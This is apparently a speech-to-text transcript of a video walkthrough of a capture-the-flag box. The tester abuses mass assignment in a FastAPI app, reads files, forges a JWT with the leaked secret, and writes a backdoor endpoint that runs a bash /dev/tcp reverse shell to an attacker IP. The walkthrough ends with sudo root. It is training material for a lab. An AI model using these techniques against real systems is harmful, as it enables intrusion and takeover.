 what's going on youtube this is ipsec i've been doing back-end 2 from the uhc april finals and this box is very similar to the first one back end in the sense that it's a api server that you're attacking that runs fast api in the first back end we talk a lot about the importance of fuzzing api servers with different methods and then leading up into an eye door vulnerability the same things apply to this one except instead of idor it's going to be a mass assignment vulnerability which is common in apis and then in order to get code execution the very first box back end had a endpoint that you could just execute code off of this one has a file right and you can modify the web server code to add an endpoint to execute a reverse shell for you so with that being said let's just jump in as always we're going to start with an nmap so dash sc for default scripts sv enumerate versions oh a i'll put all formats bring the nmap directory and call it backend 2 and then the ip address of 1010 11.162. this can take some time to run so i've already ran it looking at the results we just have two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server then we also have http on port 80 its banner tells us it's uv icon and then based upon this stuff it looks like nmap for some reason couldn't exactly flag it but we see it's sending http messages and it's on port 80 so it's definitely a web server so let's just take a look at it if we do 2 10 10 11 162 we get something that looks very similar to the very first version of backend it just says uhc api version 2.0 and if we had ran a go buster against this we know there is a slash api directory and it's telling us the endpoint so it's api v1 and then there's a user and admin endpoint underneath this v1 so if i do slash user we get a not found if i do slash admin we get not authenticated and if we look at the network we can see this is a41 and the other one i want to say the user's a 404 and this is where it becomes very different in testing apis just like in the first backend you have to fuzz different methods and when you generally test a web app if you get a 404 you don't really traverse past the directory but in an api it just means nothing was coded there and you can traverse it so if i do slash user slash 1 which is a really common api thing to get the user with id1 we do get an id and we can do two three and get a bunch of users that way so let's start up a ferro buster because i like using ferro buster to enumerate apis because it does a good job with recursion and before we do ferro buster um how i have it installed is a little bit different because the one on apt is out of date and i always like running the most up-to-date ones because um fair buster got a lot of updates after the first version of back end to make it a bit better at identifying apis so how i install it is i just go to the release and then download the one for my system which is going to be a 64-bit linux and then i just go into or echo path and i want to put in user local bin whenever you see the local directories that means it's probably not managed by a package manager so this is a good place to put it and we can w get this oh we have to run it with sudo and then i'm going to remove my old version of ferro buster and then we can add the new one so sudo tar xjvf and we'll do x86 this file copy it paste oh let's see it's not a valid bzip2 uh what is that it's not oh it's just xvf okay so i think that is now unturned so if i do sudo chmod plus x on ferro buster now we have it installed and i can remove the tar archive so that's generally how i install the latest version i don't know if it's correct but it's what i do so cd dash to get into my previous directory and we can run a ferro buster so i'm going to do dash u for url http 101011 162 then slash api v1 user and then i'm going to specify dash dash force recursion so this means if it finds something or if like it'll just force rekursh into a directory that doesn't exist because normally i think it would hit this user directory and say hey user is a 404 oh man my computer's being wonky let's say users of 404 let's not go behind this so that's why we do the force recursion and then we want to filter out error codes i'm going to filter out 404s and then for the methods i'm going to use get and post and if we run this we can see right away anything we get with a any get request here is returning something it wants to recurse into it that's why we have all of these and that's a bit too much because if we do this um get here what do we return um see looks like the web app it did https i don't want that there we go we get a 405 so we could probably filter out 405s as well so we add that and we're still getting a lot of things so what does logs give us so two directories give us that logs if we do this it's running the get we can see having ferro buster and run this definitely does slow down the app maybe it's actually not even running right now there we go this logs gives us a 422 message and the 422 is just telling us we have an error in our api so we don't want to filter this out because if we make a request that is to a new endpoint and that error is saying hey the way you made this request is wrong um we want to see that right so the best way to go about this is just remove gets because we know we can recurse with um id numbers and by id numbers i mean we know user one does something so chances are there's no more routes for this because the get parameter is already taken with something dynamic here so what we could do now is if we curl this we can get things so we can dump the whole database we can see exactly how far it goes if we do 10 12 so it looks like there's 11 fields and generally when i dumped i always would just put everything in a new file but now i've learned jq a bit more i'm going to do this a bit differently so i'm going to do 4 i n sequence 0 to 11 do curl and we're going to hit this right and we just do i if we do done it's going to put all the um jsons on one line so after this i'm going to separate the object with a comma and then i know the first one came back null because there's no id 0 so i'm just going to change the sequence to b1 and now we're outputting a json blob so i'm going to pipe this to out.json and we're just going to let this run and i didn't need to do 2 here because i did after the loop so everything out here should be sent here so if i cat out.json we have this and this becomes helpful because if i just do cat this jq dot it's going to give a purse error because it's not proper so the way we can fix this is by just making this an array so we just put the square brackets around it and now when i run jq dot it does this whole thing and now the cool thing about this is if you watch my last video on um let's see youtube.com c ipsec the video where i um purse bloodhound with jq we can do something similar here so i'm going to do a select or before we do select i can just do pipe it and we want to get past this list so i'm going to do that and what that does it just gets rid of the list and now i can say like dot email and dump all emails now if i really wanted to search through this data we could do a select and say is super user and we begin this with a period is equal to true then we pipe this dot email so we know there's one super user if we did this to false we could do that so that's kind of why i like doing jq because my typical thing was to output it with a bunch of files and then like use grep to find which file contains true and is super user and then cat that file but just giving it to one big json blob makes it so much easier to parse through as long as you know jq and how to do like select statements so if you want to do more definitely check out this video but it doesn't really help us all that did was kill time for fair buster to run and we see there are two endpoints we have user uh user login and user sign up and these are post so if i curl dash x post on this url the sign up we get a message and it's all in um jq so i'm going to do that i'm also going to add a dash s so we hide this i think s is silent so now we just see um field missing so if i put in a field so if we do d let's say email is equal to ipsec and see what happens we see value is not a dictionary so we decide to convert this into a dictionary and after this it's still saying that so we have to then use a header and say the content type is json data and here we go we have two fields missing email and password oh email's not missing it just says it's not a valid email address so let's change this to be root ipsec dot rocks and then create a second entry this will be password and this will be equal to please subscribe okay so now it looks like we created an entry if i run this again we get a error message saying the username already exists so we know we created the account so the next piece to do is sign in so what i'm going to do is just go back and i think it was sign in or login is it login looks like it is login and we get username and password is missing so let me change username or email to be username because that's how it wants it here and it's saying values missing so maybe this endpoint is wanting um just the normal way to do url encoded not a dictionary so i'm going to remove that header and we're going to pass it the normal way so username is equal to that and password is equal to please subscribe and we send this and it gives us back an access token and of course we could jq it to make it pretty but we get an access token and this token is used to authenticate against the application and if we had ran a go buster on just here we'll notice there is a slash docs endpoint that just says not authenticated so in typical apis how you authenticate is through a bearer token so let's input this so i'm going to put this through burp suite and the bearer token goes authorization bearer and then the token and this is just a jwt token so if we went to jwt dot io um let me turn suite off and paste it in this token we could see what it is information about my user when it expires when it was issued at i'm not a super user my guide things like that so um so we put this in and let's turn grip suite back on so we can forward this request and then it's going to make a request to open api.json put this in again and we are now at the fast api documentation we'll actually swag the documentation for open api and we can see everything about it so these endpoints just documentation what these do the default endpoints is just for routing information so users can find how to get to the user so i'm going to collapse that and if we went here we can try it out and play with this so user one we have this i think it went to 11 so now is probably 12 that would be me we can see root at ipsec.rocks there so if we look at the other ones we have a edit profile so if i try this out it wants user id if i try one and execute it we get the um let's see response where was this curl put validation oh not authenticated so um i have dark mode on if i didn't have this on the lock would be much more visible so after we access fast api anything with a lock here is an authenticated endpoint so we have to authenticate against it so i just do root at ipsec.rocks put in the password of please subscribe and then now in this application it will automatically keep us logged in bad request let me oh i did case i don't think i capitalized it before let me just copy and paste the password authorize there we go so now i can hit this edit endpoint so if i execute the response i get is false it didn't work and that's probably because i was trying to edit the first user if i try to edit user number 12 which is me we get result true so if i go back to this and we do user one administrator the profile is just uhc admin if i do user12 my profile is string so we can change this profile to be anything we want so if i do please subscribe there execute we see result is true run this again and we have the profile now saying please subscribe so the vulnerability here is going to be a mass assignment vulnerability and this is common in apis because a lot of apis don't really have it exactly hard-coded the values they take and we'll look into the source code of this at the end of the video to better explain it but since they don't hard code all the variables they take sometimes if you give them extra they add it into their request and it gets added to the database so even though this endpoint doesn't ask for let's say that is super user we can still probably add it in so i'm going to do is super user true and then execute this and we see the result is still true if i go up to this user id and execute i can see where is this right here i am now a super user so i've now escalated my users privileges to be that and this edit password field behaves the same exact way it's also vulnerable to the same thing but i put this in here because i wanted people to try and do an eye door vulnerability and find out it doesn't work so like if you want to change your password to user id 1 to be string we'll see it says false you can change your own password but you can't change other users passwords and also with this field it's also mass assignment so you could make yourself an admin and now if we execute this admin check it's still going to return false and that's because we logged into fast api with their old token so if i turn intercept on and we execute this and look at my token it didn't get updated when we like upgraded a user so it still says is super user false if i now go in the fast api we can sign out and then sign back in so root ipsec dot rocks please subscribe click authorize and then let's just intercept a token again because the token gets created when we do this login we're getting a new token and this one calls us a super user so let's turn intercept off and now result is true for this admin function so we could get at this point the user flag of the machine which is that right now or we can do this and get a lfi on the server so if we read this we do api v1 admin file file name and it wants it in base64 url and base64 url is pretty much the same thing as base64 it's just the special characters are different because special characters in um base64 include like the plus and i forget the other character but plus is a very bad thing in urls because this could mean a space so it's a bad character um for that so if we try this out we can uh just test it first so if we do echo let's do dash n to kill any line breaks etsy pass wd base64 i don't see any other special characters so i can just grab this cutting off the equal signs because there's no padding in url base64 and we execute this and we get the file so um the next thing to do would be probably create something to make this easier to work with because this is copy and pasting in a bit of a pane so i'm going to create a script called get file.sh and the very first thing this is going to do is define the token and the token's going to be our bearer token so i'm just grabbing it from burp suite so we grab this and paste it in the next thing we need to do is create a function so base64 url it's not gonna be a function we're just going to always convert things and we do echo dash n and then dollar one is going to be the argument and since we want it to be base64 url we have to go to google and figure out a way to do base64 url from within bash so if we do base64 um url bash let's just see what this gets us we have a stack overflow here and let's see this one looks good so i'm going to copy this and then we'll talk about it so this is using tr and it's replacing slash slash was the other bad character so slash and plus and default base64 um strings and those don't work with urls too well so slash is really an underscore and plus moves over to a dash or a hyphen and base64 url and then that's all this does so this is a replace for those characters replacing them and then this is just removing all equals so that's it the next thing we have to do is the curl so we do curl dash s and then http 101011 162 api v1 what was it api v1 admin file admin file and then b64 url i think that may be it let's see what happens when we execute this so chmod plus x get file oh that's not it we have to do like the um cookie so dash h authorization bearer token i'm gonna put that in double quotes because if i do it in single quotes then um it'll actually send dollar token instead of expanding it so now if i do dot slash get file etsy pass wd we return this and this is just a json blob if i do jq and dot file it should get rid of that so let's type this to jq type dot file that's good and we're still getting json syntax because it's trying to make it one line and escape things as we see every line break is slash n so what i'm going to add is dash r for dash raw and that's going to get rid of that so now we can get files on the server so whenever i have an lfi the very first thing i go for is the proc directory so i generally do proc self cmd line and we can see [Music] this is python 3 it's running multi-processing spawn and import spawn main so there's nothing really here in this one so the next thing i'm going to do is get in buy-in and here we can see the app module is going to be app main so this is probably going in the app directory and main.pi so if i just did um app slash main.pi we get the source code to the application the other good piece of information i normally get we also see api key here which will play a key role later but one other thing i really like is stat because this tells us what pid this is so we are paired 1830 and then this pid is the parent and we can also look at parent information so if we do 1821 slash cmd line we can see the parent process python 3 it's running uv icon it's got this reload flag which is telling uv icon to watch over all python files and reload the application whenever something changes and then again we have app.main so um if you're wondering how i knew this is the um parent process i just looked at demand for a proc and then let's see i'm going to search for slash stat because i think this goes into it right here so this is telling a bunch of information within the proc so proc pid stat and the very first one is pid then we have this com then the state so it's in a sleeping state because it was s uh the parent process the parent group id the session so it's got a lot of good information in here and if you ever have questions about the proc directory refer back to the man page like i just did so this reload i mention it because if we looked at the documentation the other functionality we have on this app is a post to write a file so if we write over a python file it will automatically reload and load our code which is super handy so let's go and enumerate this application so we know at main.pi and if i look at this let's just put this to be main.pi v so we have syntax highlighting we can see the structure so we have app schema user this is um directories api router this is probably going to be interesting to us because this is going to be how we find where the user endpoint is but i always like finding config first so app core config so i'm going to try downloading that file real quick so we're going to go back to this get file thing and do app core config.pi and if we look at it we have the jwt secret to be os dot environ api key so it's loading the environment variable api key for the jwt secret and if we went back to uh proc self environ we can get the api key here so with this we can sign any jwt so if i go back to jwt.io and i paste in my secret here i'm always careful whenever i do this to erase the year 256 bit and then paste it in we can see it says signature verified still so we know we have the correct thing and i love doing taking this in any pen test because they rarely rotate these secret values so after every pen test you should tell them to rotate and then if you go back it's a yearly and monthly whenever you go back to test it i always test my old sonic key and maybe i can just forge my way back in without any exploits and ask them why they didn't update it when we asked them to but um it's a really fun just persistent mechanism in web apps that often goes undetected so we got that let's go back to app main.pi so we look at this the other thing is this api router so if we see how this is used so right here we have app get actually we can just use this file i guess but if you wanted to we could import other things so we can see app include it's doing the api router and the prefix is going to be api v1 string so if we look at what the api router is app v1 api so this is app v1 api is it api router.pi or is this it that's not it what is it so it's doing from app api v1 api and then loading api router from this file so it's api.pi app v1 let's just grab api router out of main.pi there we go so app api v1 api.pi there we go so we can see what this file is it's loading the endpoints user and admin so if i do a app api v1 endpoints if i do endpoints.pi nothing exists so we try user dot pi like this and we find this file and this is just going to be the whole user source code and we could also do admin dot pi but this is how we can extract source um so knowing how like python works definitely does help to enumerate these type of vulnerabilities or at least extract source code from the web application so the next piece we want to do is write a file if i went back to this docs page and we try to write something so the very first thing i'm going to do is try to write to something simple so echo dash n temp ipsec and we want to base64 this and then we can just grab this put it in and the file ipsec was here so i just want to write to this and we see the detail debug key is missing from jwt so we didn't actually write to the file if we look at the source code admin.pi was the last thing here's router post file file name we're writing file and it's if debug is not present in currentuser.keys then raise the exception so at this point this is where having that api key comes in handy because we can just grab this go to jwt.io paste it in and add debug into a jwt so now if i copy this can go back here if i'm really lazy we can just intercept this with burp and replace her token burp intercept is not on turn it on execute and we want to replace this bearer token because again doesn't update when we edit so for that request and we can see the result is a success so the file name is temp ipsec so if i do dot slash get file on temp ipsec we can see the file so let's copy get file i'm going to call this exec.sh and what we want to do first is put a new token here do i have it in a clipboard i think i do and what we're going to do is replace uh what file do we want to replace what do the user endpoint so if i get file api let's do user.pi save this to a file so user.pi and the issue is whenever we upload a file we have to put it in json and it's a pain to escape all this json right because there's gonna be new lines we have to escape quotes all those things but thankfully we can just like um go to google and say um let's see string to json escape probably find a website to do it for us so i'd never send anything it's like sensitive file here always choose like the least sensitive file as possible because now we're sending it somewhere on the internet but i'm going to copy this to my clipboard so user.pi is in clipboard actually before you do that let's edit user.pi and we want to create a new endpoint so i'm just going to grab the this endpoint so i'm going to take this user id put at the end and i'm going to make this routing method so this is the method get put delete and post are the methods i'm going to use delete because we haven't used it before and i'm going to call this show me response model this is a bidantic thing on like how the response back to the user must conform i'm just going to delete that because we don't care and then for this i'm not going to give it any variables so we're going to remove all variables from the function and we're just going to say sends a shell to ipsec so at this point we can either google up a uh python reverse shell or just do it ourselves with our normal shell and that's what i'm going to do so os dot system we do bash dash c bash dash i do this dev tcp 10 10 14 8 9 000 1 0 and 1 like this and then we can just return nothing now you could um put an argument here like i p address and send the shell to whatever ip address typically when i do testing i avoid doing things like that because hard coding the ip address makes it harder for other people to abuse so this is a bit more secure i guess and also we could just crash the whole application we don't have to be kind about it right but crashing the applications never a good thing so that's why we're making sure our code does things well and by crashing the application i just mean if we overwrote the whole python file just put a reverse shell application will reload or shell would execute but then again the web app would be down so we don't want to do that i think this is fine so i'm going to click escape and then it gives us this nasty string so i'm going to do v escaped and paste this in so now i can do go back to my exec and let's see the file name is going to be the user.pi so let's see history grep user.pi we want this right here so i'm going to hard code the parameter to be that and then we need to send it data so we also do h the content type of application json and then the data and do double quotes file well normally i would do something like this right file and then cat escaped but if i actually did this um it's gonna send the dollar cat escaped so i can show this real quick if i just put an echo ahead of here bash exec.sh i don't even know where that error was line one what if i just have this a comment it runs i think my echo command failed you'll just have to trust me that um the quotes would send it unexpanded or whatever it's called unprocessed so to get around that i'm going to put this in double quotes and then we'll escape the quotes in here okay so now i think we have something that's going to drop a file so we run it we got null that's not good we should have got something else oh um we need to change the method to a post x post and we still get null is the application still up so if i hit this do i still get it i do so we do a post api v1 admin file file name so we're doing x post api v1 admin file base 64 url authorization bearer token that seems fine content type i want to say this is good but obviously it's not so let's see curl send to proxy forget exactly how to send this to prep suite see what is curl come on i think it's just probably proxy right proxy http localhost 8080. hopefully this works intercept on send it looks like it did success what the exact oh i'm grabbing for dot file and it's not dot file it's not result so if i take this off of burp suite yeah it does say success okay that makes sense so now if we refresh this docs and we're going to have to do so putting our new token on we're not a new token we just need a token on so i'm going to copy this refresh we have to do this authorization bearer like that send it and going here we have a new endpoint it automatically added it so the whole fast api thing the reason why i like it so much is if we look at this we can see route delete shell me and what it says we got delete put the url or the function here the description is really the comment in this code so we can see exactly what it does um this is the function name fetch user so that's wrong we didn't update that if i change this here it would have updated but we have this so let's just listen on 9001 and then we can try it out by executing it and we get a shell so python3.c let's just import pty to make a better shell sdgy raw minus echo fg okay so now we have this auth.log and if we view it we can get a password here and this is something common whenever you look at log files look at the usernames because every now and then someone puts their password in for the username and we could have skipped of pretty much the whole like file right piece of this box because if we looked at app um let's see i think it's in main right no it's probably gonna be in login so sit here so the user endpoint so api v1 um endpoints v user.pi if we were looking at this oh man let's see i have used up high here so if we look at the login we can see it does a open off.log to write that here right so if we had known that we could have just done a get file auth.log and then saw this and try to ssh in because if we do the proc self cmd line or maybe proc self environ we get the username uh let's see the user is htb and the home hdb so if i do ssh hdb at 10 10 11 162 and grab this this should just let us in as well so and if we do pseudo dash l put in the password it's having us play this game of wordle and this is something i put on the altered machine and altered was uhc's box last month but no one made it this first so i didn't get to see anyone play with it on stream so um i ended up putting it back on this box so in this one we did that i don't know other words this could be so it's not any hacks this is probably gonna be a syscall right i'm just going to do this so we get all the words i can see what it was it was you time so ctrl c out of this if we look for the actual pam module i'm going to do let's see let's just do find slash to dev null grep wordle we can find the module here in this um user lib x86 64 security pam wordle the other way we probably could find this is through timestamps because most of the pam modules are placed there by package manager and this pam wordle is not a package manager i just mainly put this here so the timestamp should be a full 32-bit one because that's what the file system uses but apt only goes up to the seconds so if you've watched all of my videos you've probably seen me do something like this before this find command to show the full timestamps and what i'm talking about is when we see let's change this to be let's do etsy first so right here we have a bunch of zeros and whenever you see this this is probably not user created this is probably created out of like an archive so this multi-path this is something i edited shadow host hearst name those are all generally user edited things i think this is actually a sim link if we lsla on that no that's not but these are all like ca certificates i'm guessing this gets edited in real time but this is a good way to find things so i'm going to grep dash v want to get rid of three zeros so by doing that we took it from oh wow there's still a lot of files 39 000 files down to [Music] 3400 right um and if we look at pamd oh looks like all these pam have been edited but let's try the slash user directory instead of etsy so slash usr we have a bunch of python we can remove pi c because python whenever you execute a python file it compiles it and puts the cache in a pi c file so obviously um you're going to have a lot of those so i'm going to do pipe i mean escape pipe this is an or in grep i'm going to do pi c ends with like that and now we've taken this down to 16 lines did i do a dash c before i was doing dash c's uh there are 633 files in etsy and then after grabbing those zeros we went down to 61 files i was like that's a lot of files when i was saying that but yeah um it still shrinks it down a lot so there's only 61 things we'd have to go through in etsy to see the user edited things and here there's 16. so let's take a look at slash user so this is kernel stuff so whenever you build out the kernel um it creates these files so that could be ignored this i want to say the h hardware database i think this is where it like keeps track of your next mac address so when you boot up again your nics always get like the same ens or eth number so that's not interesting cache isn't interesting but here we have the wordle module.so so we can see this is interesting if i do a strings against this file and we look we can see one of the things that sticks out is opt dot words now that's a file if i cap this we have all the words to wordle so now we can cheat wordle so let's hdb um 10 10 11 162. and we want to put the password in which keyboard walk and underscore hdb estimation point yep so sudo l do that again and now we can cheat so i'm going to type the word union and we know it has an i and an o so i'm going to do grep i o let's try oh we want grep i and grep o there we go so we can try posix and that was correct and the password is wrong retype that it wants us to play again what posix it starts with p so let's start this with p uh putty no pg oh it has a t so t [Music] the t is in the correct spot oh it's prctl there we go and i can run anything so if i do sudo su there we are we are root and that is the box so apologies for the sloppy cut i just remembered i wanted to show the mass assignment vulnerability what it looked like in the source code and i forgot so um i'm in the app api v1 endpoints directory and that's where user.pi is and if we go here and we look at the function for editing a user we can see it right here so we have db this is going to allow us to query the database token this is the jwt new user this is going to be our user input and user id is the user input from the get parameter so if you remember we go to this docs and we have edit and we have two places we could put user info we got user id here and this profile right and the first thing it checks if it's a super user because if i'm a super user i want to allow editing of any user um and we get that by doing this query so this u is going to get the id well the user where the id is in the token and as i'm looking at this this code is buggy or bad right now because even if i was a super user and i went and edited something so um editing user id one so if i put this in i'm currently got a super user token and let's log in actually root at ipsec dot rocks please subscribe i think i typed that password yep please subscribe authorize there we go so if i send this our response was null not failed see if i do 12 response is null so let's get user id 12 real quick heading user id 1. okay let's put user id 1 and [Music] put a bunch of junk here execute i bet it's going to change mine currently yeah we see the junk here so my bad code i didn't even test out the super user function because i'm grabbing the user object and then if i'm super user i'm just allowing editing it but i grabbed it from the jwt token not the get variable and right here the db object is you and we're updating new user so new user is anything um in here right and i just had created it to say like profile but it could be anything because we're not putting any of the fields in the actual function so that's how it happens right new users sent to from this and the application is like okay i'm going to take that json and throw it into the database right so that's how a mass assignment vulnerability kind of happens um over here we see if i'm not a super user then i'm going to query get my user id if u.id does not equal user id remember user underscore id is coming from the get parameter then we're going to say result is false otherwise we're going to update this user object u this is going to be the result of the query it's only going to be 1 because we have dot first so the result of the query and we're going to replace it with object in new user so replace it with this typically pedantic is going to prevent all these errors remember i said that word before with user output but if i go into the actual schemas here you can see i did some hand waving stuff to make this vulnerable because it's typically not a python vulnerability so pedantics are in my schemas and if we do user update you can see i'm passing in this hidden from schema is equal to true so typically pedantic would only have this profile string and if it did if i put in something here so if we went to 12 and i now try um is super user well probably have to set it to false first so we gotta disable our super userness first because we have that one query and see user id 12 null user id 11. so do we not exist in the database anymore oh we screwed something up but um ideally if you had it done this way and not all these hidden from schemas equal true then pydemic pedantic would have a scheme of verification error and just drop the request all together um i screwed up the application testing it but that's the whole theory behind it you find these vulnerabilities a lot in like ruby based applications because of um i want to say they call it like scaffolding where they just have the database magically work based upon the parameters you have in the web code but it does exist in every language fast api doesn't require use pedantic so if i didn't use pedantic at all it would have been vulnerable as well so mass assignment vulnerabilities i'd always test for them when doing pretty much any testing because it's a really hidden vulnerability that um does come up from time to time so with that being said i hope you guys enjoyed the video take care and i'll see you all next week